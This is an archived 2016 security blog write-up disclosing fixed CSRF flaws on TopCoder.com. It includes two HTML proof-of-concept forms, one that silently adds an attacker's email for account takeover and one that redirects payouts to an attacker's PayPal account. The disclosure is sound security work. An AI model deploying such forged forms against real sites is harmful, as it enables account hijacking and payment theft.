---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2016-06-28_topcodercom-vulnerabilities-a-tail-of-site-wide-bugs-leads-to-accounts-compromis.md
original_filename: 2016-06-28_topcodercom-vulnerabilities-a-tail-of-site-wide-bugs-leads-to-accounts-compromis.md
title: TopCoder.com Vulnerabilities – A tail of site-wide bugs leads to accounts compromise
  & payments hijacking
category: documents
detected_topics:
- csrf
- command-injection
- password-reset
- mfa
- otp
- api-security
tags:
- imported
- documents
- csrf
- command-injection
- password-reset
- mfa
- otp
- api-security
language: en
raw_sha256: d9fd152476ac7c834ee30b7d4923228464eeece2709934050f07a5bb82188675
text_sha256: 9056786ee32554d6b3f68f558d367aa77986fbd80b0f1ed8ea4cff49e2eb80cf
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# TopCoder.com Vulnerabilities – A tail of site-wide bugs leads to accounts compromise & payments hijacking

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2016-06-28_topcodercom-vulnerabilities-a-tail-of-site-wide-bugs-leads-to-accounts-compromis.md
- Source Type: markdown
- Detected Topics: csrf, command-injection, password-reset, mfa, otp, api-security
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `d9fd152476ac7c834ee30b7d4923228464eeece2709934050f07a5bb82188675`
- Text SHA256: `9056786ee32554d6b3f68f558d367aa77986fbd80b0f1ed8ea4cff49e2eb80cf`


## Content

---
title: "TopCoder.com Vulnerabilities – A tail of site-wide bugs leads to accounts compromise & payments hijacking"
page_title: "TopCoder.com Vulnerabilities – A tail of site-wide bugs leads to accounts compromise & payments hijacking – Seekurity"
url: "https://www.seekurity.com/blog/general/topcoder-vulnerabilities-a-tail-of-site-wide-bugs-leads-to-accounts-compromise-payments-hijacking/"
final_url: "https://seekurity.com/blog/2016/06/28/admin/general/topcoder-vulnerabilities-a-tail-of-site-wide-bugs-leads-to-accounts-compromise-payments-hijacking"
authors: ["Mohamed A. Baset"]
programs: ["Topcoder.com"]
bugs: ["CSRF", "Account takeover"]
publication_date: "2016-06-28"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6283
---

Hi Folks,  
TopCode.com is a website where the most skilled top coders around the world are solving challenges, Competing and writing codes to achieve a specific tasks. Top high profile companies like (Facebook, Google, Twitter, etc..) are getting help from such websites in their recruitment process!

[Topcoder](https://en.wikipedia.org/wiki/TopCoder) is a company that administers contests in computer programming. Topcoder hosts fortnightly online competitive programming competitions—known as SRMs or “single round matches”—as well as weekly competitions in graphic design and development. The work in design and development produces useful software which is licensed for profit by Topcoder.

**TopCoder’s Business Model**

Topcoder sells software licenses to use the growing body of components that have been developed in competition and also acts as an [outsourcing](https://en.wikipedia.org/wiki/Outsourcing "Outsourcing") center, allowing companies to farm out custom design and development tasks to Topcoder competitors. Competitors involved in the creation of these components are paid royalties based on these sales.

The software resulting from algorithm competitions—and the less-frequent marathon matches—is not usually directly useful, but sponsor companies sometimes provide money to pay the victors. Statistics (including an overall “rating” for each developer) are tracked over time for competitors in each category.

**A BIG NOTE**

We at [Seekurity](https://www.seekurity.com) are not supporting/encouraging any form of random bugs/vulnerability testing on websites/services/apps that don’t have a clear responsible disclosure rules. To be more clear, we ([@Seekurity](https://www.seekurity.com)) and ([@TopCoder](https://www.topcoder.com)) agreed on doing such testing!

**The Bug(s):**

Back to May, 2015 Seekurity team was responsibly reported a site-wide [CSRF](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_\(CSRF\)) vulnerabilities which *if maliciously used* will lead to full user accounts compromise and payment hijacking issues!

**1\. First scenario “Full Account Compromise”**

**The PoC code is:**  
<html>  
<h1>TopCoder Full Account Takeover CSRF by @Seekurity</h1>  
<body>  
<form action=”[http://community.topcoder.com/tc](http://community.topcoder.com/tc)” method=”POST”>  
<input type=”hidden” name=”module” value=”AddSecondEmail” />  
<input type=”hidden” name=”em” value=”symbiansymoh&#64;outlook&#46;com” />  
<input type=”submit” value=”One click Hijack” />  
</form>  
</body>  
</html>

**_PoC Analysing:_**

This form submit will result adding this email “[[email protected]](/cdn-cgi/l/email-protection)” as a secondary email to the victim’s TopCoder account after that attackers can initiate a password reset procedures, get password reset link of the secondary email, change victim’s password and the account is theirs.

**PoC Video:**

**2\. Second Scenario “Payment Hijack”**

**The PoC code is:**  
<html>  
TopCoder.com Payment Hijack CSRF (All your money belongs to us) by @Seekurity</br>  
<body>  
<form action=”https://community.topcoder.com/tc” method=”POST”>  
<input type=”hidden” name=”module” value=”EditPaymentPreferences” />  
<input type=”hidden” name=”accrualAmount” value=”25″ />  
<input type=”hidden” name=”paymentMethod” value=”2″ />  
<input type=”hidden” name=”paypalAccount” value=”symbiansymoh&#64; gmail&#46;com” />  
<input type=”submit” value=”Hijack My Money” />  
</form>  
</body>  
</html>

**_PoC Analysing:_**

This form submit will result in linking a Paypal email account in addition to accrual amount of money to be automatically withdrawn after reaching that limit, This scenario is more critical than the takeover accounts one since you can initiate payment account linking in bulk but for the taking over scenario you need a unique email for each account takeover process since labeled emails trick (eg. attacker+[Random]@gmail.com) won’t work here!

**PoC Video:**

**A Highlight on discovered issues**

As you may notice these two critical form actions are not protected by an anti-csrf token which means we can CSRF any TopCoder’s users and hijack his account with just a one click (Targeted attacks) or via randomly mass attacks (embedding the PoC code in a famous websites and bingo). Hackers can hijack any user accounts or change the payment infos and bob is their uncle!  
Seems like everyone is caring about developing without seeing the potential of a security issue!

The issues has been fixed now by adding a site-wide anti-csrf tokens protecting sensitive form submits against such attacks.

Thanks for reading!

**Hey!**  
Building a website? Or already built a one? Think twice before going public and let us [protect your business](https://www.seekurity.com/#pricing)!

[](https://www.addtoany.com/add_to/facebook?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2016%2F06%2F28%2Fadmin%2Fgeneral%2Ftopcoder-vulnerabilities-a-tail-of-site-wide-bugs-leads-to-accounts-compromise-payments-hijacking&linkname=TopCoder.com%20Vulnerabilities%20%E2%80%93%20A%20tail%20of%20site-wide%20bugs%20leads%20to%20accounts%20compromise%20%26%20payments%20hijacking "Facebook")[](https://www.addtoany.com/add_to/pinterest?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2016%2F06%2F28%2Fadmin%2Fgeneral%2Ftopcoder-vulnerabilities-a-tail-of-site-wide-bugs-leads-to-accounts-compromise-payments-hijacking&linkname=TopCoder.com%20Vulnerabilities%20%E2%80%93%20A%20tail%20of%20site-wide%20bugs%20leads%20to%20accounts%20compromise%20%26%20payments%20hijacking "Pinterest")[](https://www.addtoany.com/add_to/twitter?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2016%2F06%2F28%2Fadmin%2Fgeneral%2Ftopcoder-vulnerabilities-a-tail-of-site-wide-bugs-leads-to-accounts-compromise-payments-hijacking&linkname=TopCoder.com%20Vulnerabilities%20%E2%80%93%20A%20tail%20of%20site-wide%20bugs%20leads%20to%20accounts%20compromise%20%26%20payments%20hijacking "Twitter")[](https://www.addtoany.com/add_to/whatsapp?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2016%2F06%2F28%2Fadmin%2Fgeneral%2Ftopcoder-vulnerabilities-a-tail-of-site-wide-bugs-leads-to-accounts-compromise-payments-hijacking&linkname=TopCoder.com%20Vulnerabilities%20%E2%80%93%20A%20tail%20of%20site-wide%20bugs%20leads%20to%20accounts%20compromise%20%26%20payments%20hijacking "WhatsApp")[](https://www.addtoany.com/add_to/telegram?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2016%2F06%2F28%2Fadmin%2Fgeneral%2Ftopcoder-vulnerabilities-a-tail-of-site-wide-bugs-leads-to-accounts-compromise-payments-hijacking&linkname=TopCoder.com%20Vulnerabilities%20%E2%80%93%20A%20tail%20of%20site-wide%20bugs%20leads%20to%20accounts%20compromise%20%26%20payments%20hijacking "Telegram")[](https://www.addtoany.com/add_to/linkedin?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2016%2F06%2F28%2Fadmin%2Fgeneral%2Ftopcoder-vulnerabilities-a-tail-of-site-wide-bugs-leads-to-accounts-compromise-payments-hijacking&linkname=TopCoder.com%20Vulnerabilities%20%E2%80%93%20A%20tail%20of%20site-wide%20bugs%20leads%20to%20accounts%20compromise%20%26%20payments%20hijacking "LinkedIn")[](https://www.addtoany.com/add_to/google_gmail?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2016%2F06%2F28%2Fadmin%2Fgeneral%2Ftopcoder-vulnerabilities-a-tail-of-site-wide-bugs-leads-to-accounts-compromise-payments-hijacking&linkname=TopCoder.com%20Vulnerabilities%20%E2%80%93%20A%20tail%20of%20site-wide%20bugs%20leads%20to%20accounts%20compromise%20%26%20payments%20hijacking "Gmail")[](https://www.addtoany.com/share)

accounts  bugs  by  Coder  compromise  hijacking!  leads  of  payments  site-wide  tail  to  Top  TopCoder.com  wasn't  written
